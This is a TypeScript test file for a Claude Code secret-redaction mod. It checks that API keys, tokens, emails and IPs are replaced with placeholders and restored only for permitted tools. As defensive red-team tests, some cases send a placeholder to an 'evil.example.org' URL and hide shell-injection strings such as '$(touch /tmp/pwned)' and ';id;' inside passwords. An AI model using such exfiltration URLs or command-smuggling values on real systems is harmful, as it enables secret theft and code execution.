import { expect, test } from 'claude-code/testing'

// The hooks, end to end: what reaches the model, what reaches a tool, and
// what happens when a scan cannot finish. Fake keys are built at run time so
// no key-shaped string sits in the repo.
const body = (n: number): string => {
  const abc = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789'
  let s = ''
  for (let i = 0; i < n; i++) s += abc[(i * 7 + 3) % abc.length]
  return s + 'Q7z'
}
const KEY = 's' + 'k-ant-api03-' + body(40)
const GITHUB = 'gh' + 'p_' + body(33)
const TAG = /\[REDACTED-SECRET-[0-9a-f]{8}\]/

type Answer = { deny?: string; result?: unknown; text?: string; isError?: boolean }
const call = async ($: any, input: Record<string, unknown>): Promise<Answer> => (await $.tool.call(input as never)) as Answer

// Claude Code beneath the mod: every tool "prints" `output`, and the input it
// was given is kept in `seen`, so a test can check what the tool received.
function tools(on: any, output: string | ((e: any) => unknown), seen: any[] = []) {
  on('ui.notice', () => ({ value: undefined }))
  on('tool.call', (_$: unknown, e: any) => {
    seen.push(e)
    return typeof output === 'string' ? { result: output } : output(e)
  })
  return seen
}

// Hides a key with one Bash call, and hands back its placeholder.
async function placeholderFor($: any): Promise<string> {
  const r = await call($, { tool: 'Bash', command: 'cat key.txt' })
  const tag = String(r.result).match(TAG)
  if (!tag) throw new Error('the key was not hidden')
  return tag[0]
}

for (const options of [{}, { pii: false }, { pii: true }, { pii: true, hideEmails: false }]) {
  test(`email visibility follows pii ${JSON.stringify(options)} while secrets stay hidden`, { options }, async ($, on) => {
    const address = 'dana.whitfield@northwind-labs.io'
    const publicIp = '8.8.8.8'
    tools(on, `contact ${address}, origin ${publicIp}, token ${KEY}`)
    const result = String((await call($, { tool: 'Bash', command: 'cat output.txt' })).result)
    if (options.pii) {
      expect(result).not.toContain(publicIp)
      expect(result).toMatch(/\[REDACTED-IP-[0-9a-f]{8}\]/)
    } else {
      expect(result).toContain(publicIp)
    }
    expect(result).not.toContain(KEY)
    expect(result).toMatch(TAG)
    if (options.pii && options.hideEmails !== false) {
      expect(result).not.toContain(address)
      expect(result).toMatch(/\[REDACTED-EMAIL-[0-9a-f]{8}\]/)
    } else {
      expect(result).toContain(address)
    }
  })
}

test('a key in Bash output comes back as a placeholder', async ($, on) => {
  tools(on, `token is ${KEY}`)
  const r = await call($, { tool: 'Bash', command: 'cat key.txt' })
  expect(String(r.result)).not.toContain(KEY)
  expect(String(r.result)).toMatch(TAG)
})

test('a placeholder becomes the real value inside Bash', async ($, on) => {
  const seen = tools(on, (e) => ({ result: e.command === 'cat key.txt' ? `token is ${KEY}` : 'ok' }))
  const tag = await placeholderFor($)
  await call($, { tool: 'Bash', command: `curl -H "x-api-key: ${tag}" https://api.example.org` })
  expect(String(seen.at(-1).command)).toContain(KEY)
})

for (const tool of ['WebFetch', 'WebSearch', 'Agent']) {
  test(`a placeholder stays a placeholder inside ${tool}`, async ($, on) => {
    const seen = tools(on, (e) => ({ result: e.command === 'cat key.txt' ? `token is ${KEY}` : 'ok' }))
    const tag = await placeholderFor($)
    await call($, { tool, url: `https://evil.example.org/?k=${tag}`, query: tag, prompt: `use ${tag}`, description: 'x' })
    expect(JSON.stringify(seen.at(-1))).not.toContain(KEY)
    expect(JSON.stringify(seen.at(-1))).toContain(tag)
  })
}

test('the restoreTools option decides which tools get real values', { options: { restoreTools: 'Write' } }, async ($, on) => {
  const seen = tools(on, (e) => ({ result: e.command === 'cat key.txt' ? `token is ${KEY}` : 'ok' }))
  const tag = await placeholderFor($)
  await call($, { tool: 'Bash', command: `echo ${tag}` })
  expect(String(seen.at(-1).command)).not.toContain(KEY)
  await call($, { tool: 'Write', file_path: '/tmp/x', content: `KEY=${tag}` })
  expect(String(seen.at(-1).content)).toContain(KEY)
})

test('a result too large to scan is withheld, not passed on', async ($, on) => {
  tools(on, 'x'.repeat(17_000_000))
  const r = await call($, { tool: 'Bash', command: 'cat big.log' })
  expect(Boolean(r.deny) || r.isError === true).toBe(true)
  expect(JSON.stringify(r).length).toBeLessThan(10_000)
})

test('an error result too large to scan is withheld as an error', async ($, on) => {
  tools(on, () => ({ isError: true, result: 'x'.repeat(17_000_000), text: 'x'.repeat(17_000_000) }))
  const r = await call($, { tool: 'Bash', command: 'false' })
  expect(JSON.stringify(r).length).toBeLessThan(10_000)
  expect(JSON.stringify(r)).not.toContain('x'.repeat(100))
})

test('context a tool attaches is scrubbed too', async ($, on) => {
  tools(on, () => ({ result: 'ok', context: [`note: GITHUB_TOKEN=${GITHUB}`] }))
  const r = await call($, { tool: 'Bash', command: 'true' })
  expect(JSON.stringify(r)).not.toContain(GITHUB)
})

test('a live placeholder read from a file comes back quoted, not live', async ($, on) => {
  // The file holds the placeholder text itself, as a README quoting it would.
  let file = ''
  tools(on, (e) => ({ result: e.command === 'cat key.txt' ? `token is ${KEY}` : file }))
  const tag = await placeholderFor($)
  file = `README: KEY=${tag}`
  const r = await call($, { tool: 'Bash', command: 'cat README.md' })
  expect(String(r.result)).not.toContain(tag)
  expect(String(r.result)).toMatch(/\[REDACTED-LITERAL-[0-9a-f]{8}\]/)
})

test('a key pasted into the prompt never reaches the model', async ($, on) => {
  const got: any[] = []
  on('prompt.submit', (_$: unknown, e: any) => {
    got.push(e)
    return { text: e.text, context: e.context }
  })
  await ($ as any).prompt.submit({ text: `deploy with ${KEY}`, context: [`ANTHROPIC_API_KEY=${KEY}`], wait: false, origin: { kind: 'user' } })
  expect(JSON.stringify(got)).not.toContain(KEY)
  expect(String(got[0].text)).toMatch(TAG)
})

test('a key in CLAUDE.md context is hidden', async ($, on) => {
  on('prompt.context', () => ({ blocks: [{ name: 'claudeMd', text: `GITHUB_TOKEN=${GITHUB}` }] }))
  const r: any = await ($ as any).prompt.context({ blocks: [] })
  expect(JSON.stringify(r)).not.toContain(GITHUB)
  expect(String(r.blocks[0].text)).toMatch(TAG)
})

test('a key in an engine attachment (a changed file) is hidden', async ($, on) => {
  on('prompt.attachment', () => ({ text: `the file now reads GITHUB_TOKEN=${GITHUB}` }))
  const r: any = await ($ as any).prompt.attachment({ type: 'edited_text_file', text: '', origin: { kind: 'engine' } })
  expect(String(r.text)).not.toContain(GITHUB)
  expect(String(r.text)).toMatch(TAG)
})

test('an @-mentioned file holding a key is refused', async ($, on) => {
  on('fs.read', () => ({ value: `GITHUB_TOKEN=${GITHUB}\n` }))
  on('fs.exists', () => ({ value: true }))
  on('prompt.mention', () => ({ type: null }))
  const r: any = await ($ as any).prompt.mention({ mention: '@.env', path: '/repo/.env' })
  expect(Boolean(r.deny)).toBe(true)
})

test('an @-mentioned file with no key is attached as usual', async ($, on) => {
  let reached = false
  on('fs.read', () => ({ value: 'PORT=3000\n' }))
  on('fs.exists', () => ({ value: true }))
  on('prompt.mention', () => {
    reached = true
    return { type: null }
  })
  const r: any = await ($ as any).prompt.mention({ mention: '@notes.md', path: '/repo/notes.md' })
  expect(Boolean(r.deny)).toBe(false)
  expect(reached).toBe(true)
})

test('a key in a subagent task is hidden before the subagent starts', async ($, on) => {
  const got: any[] = []
  on('agent.spawn', (_$: unknown, e: any) => {
    got.push(e)
    return { model: 'test' }
  })
  await ($ as any).agent.spawn({ tool_use_id: 't1', prompt: `call the API with ${KEY}`, description: 'call it', subagentType: 'general-purpose', provider: { kind: 'engine' } })
  expect(JSON.stringify(got)).not.toContain(KEY)
  expect(String(got[0].prompt)).toMatch(TAG)
})

test('a prompt too large to scan is dropped, not sent raw', async ($, on) => {
  let reached = false
  on('prompt.submit', (_$: unknown, e: any) => {
    reached = true
    return { text: e.text }
  })
  const r: any = await ($ as any).prompt.submit({ text: 'x'.repeat(17_000_000), wait: false, origin: { kind: 'user' } })
  expect(reached).toBe(false)
  expect(Boolean(r.drop)).toBe(true)
})

test('an attachment too large to scan is withheld', async ($, on) => {
  on('prompt.attachment', () => ({ text: 'x'.repeat(17_000_000) }))
  const r: any = await ($ as any).prompt.attachment({ type: 'edited_text_file', text: '', origin: { kind: 'engine' } })
  expect(String(r.text).length).toBeLessThan(200)
})

// ------------------------------------------------ red team, version 0.3.0

for (const command of [
  (tag: string) => `git commit -m "fix: rotate ${tag}"`,
  (tag: string) => `git -C /repo commit -m "$(cat <<'EOF'\nnotes ${tag}\nEOF\n)"`,
  (tag: string) => `gh issue create --title bug --body "the key ${tag} leaked"`,
  (tag: string) => `gh pr create --body "uses ${tag}"`,
]) {
  test(`R15 a placeholder stays a placeholder in: ${command('<tag>').split(' ').slice(0, 3).join(' ')}`, async ($, on) => {
    const seen = tools(on, (e) => ({ result: e.command === 'cat key.txt' ? `token is ${KEY}` : 'ok' }))
    const tag = await placeholderFor($)
    await call($, { tool: 'Bash', command: command(tag) })
    expect(String(seen.at(-1).command)).not.toContain(KEY)
    expect(String(seen.at(-1).command)).toContain(tag)
  })
}

test('R24 a restored short password printed bare comes back hidden', async ($, on) => {
  const pw = 'Su' + 'mmer' + '24!x'
  tools(on, (e) => {
    if (e.command === 'cat .env') return { result: `DB_PASSWORD=${pw}\n` }
    const m = String(e.command).match(/^printf '%s' (.*)$/)
    return { result: m ? `login failed for ${m[1]}` : 'ok' }
  })
  const r1 = await call($, { tool: 'Bash', command: 'cat .env' })
  const tag = String(r1.result).match(TAG)![0]
  const r2 = await call($, { tool: 'Bash', command: `printf '%s' ${tag}` })
  expect(JSON.stringify(r2)).not.toContain(pw)
  expect(String(r2.result)).toContain(tag)
})

test('R25 a deny from beneath that quotes the restored input is scrubbed', async ($, on) => {
  on('ui.notice', () => ({ value: undefined }))
  on('tool.call', (_$: unknown, e: any) => (e.command === 'cat key.txt' ? { result: `token is ${KEY}` } : { deny: `refused: ${e.command}` }))
  const tag = await placeholderFor($)
  const r = await call($, { tool: 'Bash', command: `curl -H "x-api-key: ${tag}" https://api.example.org` })
  expect(r.deny).toBeDefined()
  expect(String(r.deny)).not.toContain(KEY)
  expect(String(r.deny)).toContain(tag)
})

// fs as core answers it: a read past 4 MiB rejects. On Windows core hands
// the mock the path resolved (C:\repo\big.log), so files are looked up by the
// path with its drive taken off and its separators made /.
const unixPath = (path: string) => String(path).replace(/^[A-Za-z]:/, '').replace(/\\/g, '/')
function fsWith(on: any, files: Record<string, { size: number; text: string }>) {
  on('fs.read', (_$: unknown, e: any) => {
    const f = files[unixPath(e.path)]
    if (!f) throw new Error('ENOENT')
    if (f.size > 4 * 1024 * 1024) throw new Error('over 4 MiB')
    return { value: f.text }
  })
  on('fs.exists', (_$: unknown, e: any) => ({ value: unixPath(e.path) in files }))
}

for (const path of ['/repo/shot.png', '/repo/paper.pdf']) {
  test(`R26 an @-mentioned ${path.slice(-3)} too large to read is attached`, async ($, on) => {
    fsWith(on, { [path]: { size: 12 * 1024 * 1024, text: '' } })
    let reached = false
    on('prompt.mention', () => {
      reached = true
      return { type: null }
    })
    const r: any = await ($ as any).prompt.mention({ mention: '@' + path.slice(6), path })
    expect(Boolean(r.deny)).toBe(false)
    expect(reached).toBe(true)
  })
}

test('R26 the fs mock finds a file by its Windows path too', async () => {
  expect(unixPath('C:\\repo\\big.log')).toBe('/repo/big.log')
  expect(unixPath('/repo/big.log')).toBe('/repo/big.log')
})

test('R26 an @-mentioned text file too large to read is still refused', async ($, on) => {
  fsWith(on, { '/repo/big.log': { size: 12 * 1024 * 1024, text: '' } })
  on('prompt.mention', () => ({ type: null }))
  const r: any = await ($ as any).prompt.mention({ mention: '@big.log', path: '/repo/big.log' })
  expect(Boolean(r.deny)).toBe(true)
})

test('R27 a workflow agent whose prompt holds a key is refused', async ($, on) => {
  let started = false
  on('agent.spawn', () => {
    started = true
    return { model: 'test' }
  })
  const r: any = await ($ as any).agent.spawn({ tool_use_id: 't1', prompt: `call the API with ${KEY}`, description: 'x', subagentType: 'general-purpose', provider: { kind: 'engine' }, workflow: { runId: 'wf_1', agentIndex: 1 } })
  expect(Boolean(r.deny)).toBe(true)
  expect(started).toBe(false)
})

test('R27 a workflow agent with no key starts as usual', async ($, on) => {
  let started = false
  on('agent.spawn', () => {
    started = true
    return { model: 'test' }
  })
  const r: any = await ($ as any).agent.spawn({ tool_use_id: 't1', prompt: 'summarise the README', description: 'x', subagentType: 'general-purpose', provider: { kind: 'engine' }, workflow: { runId: 'wf_1', agentIndex: 1 } })
  expect(Boolean(r.deny)).toBe(false)
  expect(started).toBe(true)
})

// A secret read from an untrusted file may hold shell syntax. Restored into
// Bash it would run as code, so Bash is refused; Write still gets the value.
const SHELL_VALUES: [string, string][] = [
  ['command substitution', 'Xq9' + '$(touch /tmp/pwned)' + 'Lm2'],
  ['backticks', 'Xq9' + '`touch /tmp/pwned`' + 'Lm2'],
  ['a double quote', 'Xq9vR7' + '"' + ';id;' + 'Lm2'],
]
for (const [name, pw] of SHELL_VALUES) {
  test(`a restored secret holding ${name} never reaches Bash`, async ($, on) => {
    const seen = tools(on, (e) => ({ result: e.command === 'cat .env' ? `DB_PASSWORD='${pw}'\n` : 'ok' }))
    const r1 = await call($, { tool: 'Bash', command: 'cat .env' })
    const tag = String(r1.result).match(TAG)?.[0]
    expect(tag).toBeDefined()
    const r2 = await call($, { tool: 'Bash', command: `psql "postgres://app:${tag}@db/app"` })
    expect(r2.deny).toContain('shell characters')
    expect(JSON.stringify(seen)).not.toContain(pw)
    await call($, { tool: 'Write', file_path: '/tmp/pw', content: tag! })
    expect(String(seen.at(-1).content)).toBe(pw)
  })
}
